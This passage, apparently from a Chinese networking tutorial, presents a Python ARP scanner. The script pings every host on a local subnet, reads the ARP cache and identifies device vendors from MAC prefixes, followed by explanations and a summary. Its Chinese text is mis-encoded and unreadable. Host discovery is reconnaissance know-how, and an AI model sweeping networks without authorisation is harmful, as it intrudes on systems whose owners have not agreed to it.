class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># day10_arp_scanner.py</span><br><span class="hljs-comment"># åŠŸèƒ½ï¼šARPæ‰«æå·¥å…·</span><br><br><span class="hljs-keyword">import</span> socket<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> ThreadPoolExecutor<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">ARPScanner</span>:<br>    <span class="hljs-string">&quot;&quot;&quot;ARPæ‰«æå™¨&quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-comment"># OUIæ•°æ®åº“ï¼ˆéƒ¨åˆ†å¸¸è§å‚å•†ï¼‰</span><br>        <span class="hljs-variable language_">self</span>.oui_database = &#123;<br>            <span class="hljs-string">&#x27;00:50:56&#x27;</span>: <span class="hljs-string">&#x27;VMware&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:0C:29&#x27;</span>: <span class="hljs-string">&#x27;VMware&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:1C:42&#x27;</span>: <span class="hljs-string">&#x27;Parallels&#x27;</span>,<br>            <span class="hljs-string">&#x27;08:00:27&#x27;</span>: <span class="hljs-string">&#x27;VirtualBox&#x27;</span>,<br>            <span class="hljs-string">&#x27;DC:A6:32&#x27;</span>: <span class="hljs-string">&#x27;Raspberry Pi&#x27;</span>,<br>            <span class="hljs-string">&#x27;3C:A9:F4&#x27;</span>: <span class="hljs-string">&#x27;å°ç±³&#x27;</span>,<br>            <span class="hljs-string">&#x27;28:6C:07&#x27;</span>: <span class="hljs-string">&#x27;å°ç±³&#x27;</span>,<br>            <span class="hljs-string">&#x27;F8:A4:5F&#x27;</span>: <span class="hljs-string">&#x27;åä¸º&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:E0:4C&#x27;</span>: <span class="hljs-string">&#x27;åä¸º&#x27;</span>,<br>            <span class="hljs-string">&#x27;AC:DE:48&#x27;</span>: <span class="hljs-string">&#x27;Apple&#x27;</span>,<br>            <span class="hljs-string">&#x27;00:03:93&#x27;</span>: <span class="hljs-string">&#x27;Apple&#x27;</span>,<br>        &#125;<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mac_vendor</span>(<span class="hljs-params">self, mac</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ ¹æ®MACåœ°å€è·å–å‚å•†ä¿¡æ¯</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            mac: MACåœ°å€å­—ç¬¦ä¸²</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            å‚å•†åç§°</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-comment"># æå–OUIï¼ˆå‰3ä¸ªå­—èŠ‚ï¼‰</span><br>        oui = <span class="hljs-string">&#x27;:&#x27;</span>.join(mac.split(<span class="hljs-string">&#x27;:&#x27;</span>)[:<span class="hljs-number">3</span>]).upper()<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">self</span>.oui_database.get(oui, <span class="hljs-string">&#x27;æœªçŸ¥å‚å•†&#x27;</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_local_ip</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        è·å–æœ¬æœºIPåœ°å€</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)<br>            sock.connect((<span class="hljs-string">&quot;8.8.8.8&quot;</span>, <span class="hljs-number">80</span>))<br>            local_ip = sock.getsockname()[<span class="hljs-number">0</span>]<br>            sock.close()<br>            <span class="hljs-keyword">return</span> local_ip<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">get_mac_address</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        é€šè¿‡ARPè·å–æŒ‡å®šIPçš„MACåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: ç›®æ ‡IPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            MACåœ°å€å­—ç¬¦ä¸²ï¼Œå¦‚æœå¤±è´¥è¿”å›None</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å·¥ä½œåŸç†ï¼š</span><br><span class="hljs-string">            å‘é€ARPè¯·æ±‚ï¼Œç­‰å¾…å“åº”</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-comment"># åœ¨Windowsä¸Šä½¿ç”¨arpå‘½ä»¤</span><br>            <span class="hljs-keyword">import</span> subprocess<br>            <span class="hljs-keyword">import</span> platform<br><br>            system = platform.system()<br><br>            <span class="hljs-keyword">if</span> system == <span class="hljs-string">&#x27;Windows&#x27;</span>:<br>                <span class="hljs-comment"># Windows: arp -a IP</span><br>                result = subprocess.check_output(<br>                    <span class="hljs-string">f&#x27;arp -a <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span>,<br>                    shell=<span class="hljs-literal">True</span>,<br>                    stderr=subprocess.DEVNULL<br>                ).decode(<span class="hljs-string">&#x27;gbk&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>                <span class="hljs-comment"># è§£æè¾“å‡º</span><br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> result.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">in</span> line:<br>                        parts = line.split()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt;= <span class="hljs-number">2</span>:<br>                            mac = parts[<span class="hljs-number">1</span>].replace(<span class="hljs-string">&#x27;-&#x27;</span>, <span class="hljs-string">&#x27;:&#x27;</span>)<br>                            <span class="hljs-keyword">return</span> mac<br><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># Linux/Mac: arp -n IP</span><br>                result = subprocess.check_output(<br>                    <span class="hljs-string">f&#x27;arp -n <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span>,<br>                    shell=<span class="hljs-literal">True</span>,<br>                    stderr=subprocess.DEVNULL<br>                ).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>                <span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> result.split(<span class="hljs-string">&#x27;\n&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> ip <span class="hljs-keyword">in</span> line:<br>                        parts = line.split()<br>                        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(parts) &gt;= <span class="hljs-number">3</span>:<br>                            <span class="hljs-keyword">return</span> parts[<span class="hljs-number">2</span>]<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">ping_and_get_mac</span>(<span class="hljs-params">self, ip</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        å…ˆpingä¸€ä¸‹IPï¼ˆè§¦å‘ARPï¼‰ï¼Œç„¶åè·å–MACåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            ip: ç›®æ ‡IPåœ°å€</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            (ip, mac, vendor) å…ƒç»„ï¼Œå¤±è´¥è¿”å›None</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">import</span> subprocess<br>            <span class="hljs-keyword">import</span> platform<br><br>            system = platform.system()<br><br>            <span class="hljs-comment"># å…ˆpingä¸€ä¸‹ï¼Œè§¦å‘ARP</span><br>            <span class="hljs-keyword">if</span> system == <span class="hljs-string">&#x27;Windows&#x27;</span>:<br>                ping_cmd = <span class="hljs-string">f&#x27;ping -n 1 -w 500 <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span><br>            <span class="hljs-keyword">else</span>:<br>                ping_cmd = <span class="hljs-string">f&#x27;ping -c 1 -W 1 <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span><br><br>            subprocess.run(<br>                ping_cmd,<br>                shell=<span class="hljs-literal">True</span>,<br>                stdout=subprocess.DEVNULL,<br>                stderr=subprocess.DEVNULL,<br>                timeout=<span class="hljs-number">2</span><br>            )<br><br>            <span class="hljs-comment"># è·å–MACåœ°å€</span><br>            mac = <span class="hljs-variable language_">self</span>.get_mac_address(ip)<br><br>            <span class="hljs-keyword">if</span> mac <span class="hljs-keyword">and</span> mac != <span class="hljs-string">&#x27;(incomplete)&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-string">&#x27;ff:ff:ff:ff:ff:ff&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> mac.lower():<br>                vendor = <span class="hljs-variable language_">self</span>.get_mac_vendor(mac)<br>                <span class="hljs-keyword">return</span> (ip, mac, vendor)<br><br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">scan_network</span>(<span class="hljs-params">self, network, max_workers=<span class="hljs-number">50</span></span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ‰«ææ•´ä¸ªç½‘ç»œ</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            network: ç½‘ç»œåœ°å€ï¼ˆå¦‚ &quot;192.168.1.0/24&quot;ï¼‰</span><br><span class="hljs-string">            max_workers: æœ€å¤§çº¿ç¨‹æ•°</span><br><span class="hljs-string"></span><br><span class="hljs-string">        è¿”å›ï¼š</span><br><span class="hljs-string">            å‘ç°çš„è®¾å¤‡åˆ—è¡¨</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-keyword">import</span> ipaddress<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ” å¼€å§‹æ‰«æç½‘ç»œ: <span class="hljs-subst">&#123;network&#125;</span>&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;â³ è¯·ç¨å€™...\n&quot;</span>)<br><br>        <span class="hljs-comment"># è§£æç½‘ç»œ</span><br>        net = ipaddress.ip_network(network, strict=<span class="hljs-literal">False</span>)<br>        total = net.num_addresses - <span class="hljs-number">2</span><br><br>        devices = []<br>        scanned = <span class="hljs-number">0</span><br><br>        <span class="hljs-comment"># ä½¿ç”¨çº¿ç¨‹æ± å¹¶å‘æ‰«æ</span><br>        <span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=max_workers) <span class="hljs-keyword">as</span> executor:<br>            futures = &#123;<br>                executor.submit(<span class="hljs-variable language_">self</span>.ping_and_get_mac, <span class="hljs-built_in">str</span>(ip)): ip<br>                <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts()<br>            &#125;<br><br>            <span class="hljs-keyword">from</span> concurrent.futures <span class="hljs-keyword">import</span> as_completed<br><br>            <span class="hljs-keyword">for</span> future <span class="hljs-keyword">in</span> as_completed(futures):<br>                scanned += <span class="hljs-number">1</span><br>                result = future.result()<br><br>                <span class="hljs-keyword">if</span> result:<br>                    devices.append(result)<br>                    ip, mac, vendor = result<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âœ… <span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">15</span>&#125;</span> <span class="hljs-subst">&#123;mac:&lt;<span class="hljs-number">17</span>&#125;</span> <span class="hljs-subst">&#123;vendor&#125;</span>&quot;</span>)<br><br>                <span class="hljs-comment"># æ˜¾ç¤ºè¿›åº¦</span><br>                <span class="hljs-keyword">if</span> scanned % <span class="hljs-number">20</span> == <span class="hljs-number">0</span>:<br>                    progress = (scanned / total) * <span class="hljs-number">100</span><br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;   è¿›åº¦: <span class="hljs-subst">&#123;progress:<span class="hljs-number">.1</span>f&#125;</span>% (<span class="hljs-subst">&#123;scanned&#125;</span>/<span class="hljs-subst">&#123;total&#125;</span>)&quot;</span>, end=<span class="hljs-string">&#x27;\r&#x27;</span>)<br><br>        <span class="hljs-keyword">return</span> devices<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">display_results</span>(<span class="hljs-params">self, devices</span>):<br>        <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        æ˜¾ç¤ºæ‰«æç»“æœ</span><br><span class="hljs-string"></span><br><span class="hljs-string">        å‚æ•°ï¼š</span><br><span class="hljs-string">            devices: è®¾å¤‡åˆ—è¡¨</span><br><span class="hljs-string">        &quot;&quot;&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;æ‰«æå®Œæˆï¼å…±å‘ç° <span class="hljs-subst">&#123;<span class="hljs-built_in">len</span>(devices)&#125;</span> å°è®¾å¤‡&quot;</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br>        <span class="hljs-keyword">if</span> devices:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;\n<span class="hljs-subst">&#123;<span class="hljs-string">&#x27;IPåœ°å€&#x27;</span>:&lt;<span class="hljs-number">15</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;MACåœ°å€&#x27;</span>:&lt;<span class="hljs-number">17</span>&#125;</span> <span class="hljs-subst">&#123;<span class="hljs-string">&#x27;å‚å•†&#x27;</span>&#125;</span>&quot;</span>)<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;-&quot;</span> * <span class="hljs-number">70</span>)<br><br>            <span class="hljs-keyword">for</span> ip, mac, vendor <span class="hljs-keyword">in</span> <span class="hljs-built_in">sorted</span>(devices):<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip:&lt;<span class="hljs-number">15</span>&#125;</span> <span class="hljs-subst">&#123;mac:&lt;<span class="hljs-number">17</span>&#125;</span> <span class="hljs-subst">&#123;vendor&#125;</span>&quot;</span>)<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\n&quot;</span> + <span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">view_arp_cache</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    æŸ¥çœ‹ç³»ç»ŸARPç¼“å­˜</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    <span class="hljs-keyword">import</span> subprocess<br>    <span class="hljs-keyword">import</span> platform<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ç³»ç»ŸARPç¼“å­˜è¡¨&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-keyword">try</span>:<br>        system = platform.system()<br><br>        <span class="hljs-keyword">if</span> system == <span class="hljs-string">&#x27;Windows&#x27;</span>:<br>            result = subprocess.check_output(<span class="hljs-string">&#x27;arp -a&#x27;</span>, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;gbk&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br>        <span class="hljs-keyword">else</span>:<br>            result = subprocess.check_output(<span class="hljs-string">&#x27;arp -n&#x27;</span>, shell=<span class="hljs-literal">True</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>, errors=<span class="hljs-string">&#x27;ignore&#x27;</span>)<br><br>        <span class="hljs-built_in">print</span>(result)<br><br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;âŒ æ— æ³•è·å–ARPç¼“å­˜: <span class="hljs-subst">&#123;e&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    ä¸»å‡½æ•°</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br>    scanner = ARPScanner()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ARPæ‰«æå·¥å…·&quot;</span>.center(<span class="hljs-number">70</span>))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;=&quot;</span> * <span class="hljs-number">70</span>)<br>    <span class="hljs-built_in">print</span>()<br><br>    <span class="hljs-comment"># è·å–æœ¬æœºIP</span><br>    local_ip = scanner.get_local_ip()<br>    <span class="hljs-keyword">if</span> local_ip:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸ’» æœ¬æœºIP: <span class="hljs-subst">&#123;local_ip&#125;</span>&quot;</span>)<br><br>        <span class="hljs-comment"># æ¨æ–­ç½‘ç»œ</span><br>        ip_parts = local_ip.split(<span class="hljs-string">&#x27;.&#x27;</span>)<br>        network = <span class="hljs-string">f&quot;<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">0</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">1</span>]&#125;</span>.<span class="hljs-subst">&#123;ip_parts[<span class="hljs-number">2</span>]&#125;</span>.0/24&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸŒ æ¨æ–­ç½‘ç»œ: <span class="hljs-subst">&#123;network&#125;</span>&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        network = <span class="hljs-string">&quot;192.168.1.0/24&quot;</span><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;ğŸŒ ä½¿ç”¨é»˜è®¤ç½‘ç»œ: <span class="hljs-subst">&#123;network&#125;</span>&quot;</span>)<br><br>    <span class="hljs-built_in">print</span>()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;è¯·é€‰æ‹©åŠŸèƒ½:&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1. æ‰«æå±€åŸŸç½‘è®¾å¤‡ï¼ˆæ¨èï¼‰&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2. æ‰«æè‡ªå®šä¹‰ç½‘ç»œ&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3. æŸ¥çœ‹ARPç¼“å­˜è¡¨&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;0. é€€å‡º&quot;</span>)<br><br>    choice = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥é€‰é¡¹: &quot;</span>).strip()<br><br>    <span class="hljs-keyword">if</span> choice == <span class="hljs-string">&#x27;1&#x27;</span>:<br>        devices = scanner.scan_network(network)<br>        scanner.display_results(devices)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;2&#x27;</span>:<br>        custom_network = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;\nè¯·è¾“å…¥ç½‘ç»œåœ°å€ï¼ˆå¦‚192.168.1.0/24ï¼‰: &quot;</span>).strip()<br>        <span class="hljs-keyword">if</span> custom_network:<br>            devices = scanner.scan_network(custom_network)<br>            scanner.display_results(devices)<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;3&#x27;</span>:<br>        view_arp_cache()<br><br>    <span class="hljs-keyword">elif</span> choice == <span class="hljs-string">&#x27;0&#x27;</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;\nå†è§ï¼&quot;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h3 id="è¿è¡Œç¨‹åº">è¿è¡Œç¨‹åº</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">python code/day10/day10_arp_scanner.py<br></code></pre></td></tr></table></figure><h2 id="ğŸ”-ä»£ç è¯¦è§£">ğŸ” ä»£ç è¯¦è§£</h2><h3 id="1-ARPå·¥ä½œæµç¨‹">1. ARPå·¥ä½œæµç¨‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 1. Pingè§¦å‘ARP</span><br>subprocess.run(<span class="hljs-string">f&#x27;ping -c 1 <span class="hljs-subst">&#123;ip&#125;</span>&#x27;</span>, ...)<br><br><span class="hljs-comment"># 2. ç³»ç»Ÿè‡ªåŠ¨å‘é€ARPè¯·æ±‚</span><br><span class="hljs-comment"># 3. ç›®æ ‡ä¸»æœºå“åº”</span><br><span class="hljs-comment"># 4. ç³»ç»Ÿç¼“å­˜ARPè¡¨é¡¹</span><br><br><span class="hljs-comment"># 5. è¯»å–ARPç¼“å­˜</span><br>subprocess.check_output(<span class="hljs-string">&#x27;arp -n&#x27;</span>, ...)<br></code></pre></td></tr></table></figure><h3 id="2-å¹¶å‘æ‰«ææé€Ÿ">2. å¹¶å‘æ‰«ææé€Ÿ</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># ä½¿ç”¨çº¿ç¨‹æ± å¹¶å‘æ‰«æå¤šä¸ªIP</span><br><span class="hljs-keyword">with</span> ThreadPoolExecutor(max_workers=<span class="hljs-number">50</span>) <span class="hljs-keyword">as</span> executor:<br>    <span class="hljs-comment"># 50ä¸ªçº¿ç¨‹åŒæ—¶å·¥ä½œ</span><br>    futures = &#123;executor.submit(ping_and_get_mac, ip): ip<br>               <span class="hljs-keyword">for</span> ip <span class="hljs-keyword">in</span> net.hosts()&#125;<br></code></pre></td></tr></table></figure><h3 id="3-MACåœ°å€å‚å•†è¯†åˆ«">3. MACåœ°å€å‚å•†è¯†åˆ«</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># é€šè¿‡MACåœ°å€å‰3ä¸ªå­—èŠ‚ï¼ˆOUIï¼‰è¯†åˆ«å‚å•†</span><br>oui = mac[:<span class="hljs-number">8</span>]  <span class="hljs-comment"># å¦‚ &quot;00:50:56&quot;</span><br>vendor = oui_database.get(oui, <span class="hljs-string">&#x27;æœªçŸ¥å‚å•†&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="ğŸ“-çŸ¥è¯†å°ç»“">ğŸ“ çŸ¥è¯†å°ç»“</h2><p>ä»Šå¤©å­¦ä¹ äº†ï¼š</p><ol><li>âœ… MACåœ°å€æ˜¯ç½‘å¡çš„ç‰©ç†åœ°å€ï¼Œå…¨çƒå”¯ä¸€</li><li>âœ… MACåœ°å€å·¥ä½œåœ¨æ•°æ®é“¾è·¯å±‚</li><li>âœ… ARPåè®®ç”¨äºIPåœ°å€åˆ°MACåœ°å€çš„è½¬æ¢</li><li>âœ… ARPä½¿ç”¨å¹¿æ’­è¯·æ±‚ï¼Œå•æ’­å“åº”</li><li>âœ… ç³»ç»Ÿä¼šç¼“å­˜ARPè§£æç»“æœ</li></ol><h3 id="é‡è¦æ¦‚å¿µ">é‡è¦æ¦‚å¿µ</h3><table><thead><tr><th>æ¦‚å¿µ</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>MACåœ°å€</td><td>48ä½ç‰©ç†åœ°å€ï¼Œå›ºåŒ–åœ¨ç½‘å¡</td></tr><tr><td>OUI</td><td>MACåœ°å€å‰24ä½ï¼Œå‚å•†æ ‡è¯†</td></tr><tr><td>ARP</td><td>åœ°å€è§£æåè®®ï¼ŒIPâ†’MAC</td></tr><tr><td>ARPç¼“å­˜</td><td>ç³»ç»Ÿç¼“å­˜çš„IP-MACæ˜ å°„è¡¨</td></tr><tr><td>å¹¿æ’­MAC</td><td>FF:FF:FF:FF:FF:FF</td></tr></tbody></table><h2 id="ğŸ’ª-ç»ƒä¹ é¢˜">ğŸ’ª ç»ƒä¹ é¢˜</h2><h3 id="ç»ƒä¹ 1ï¼šæŸ¥çœ‹æœ¬æœºä¿¡æ¯">ç»ƒä¹ 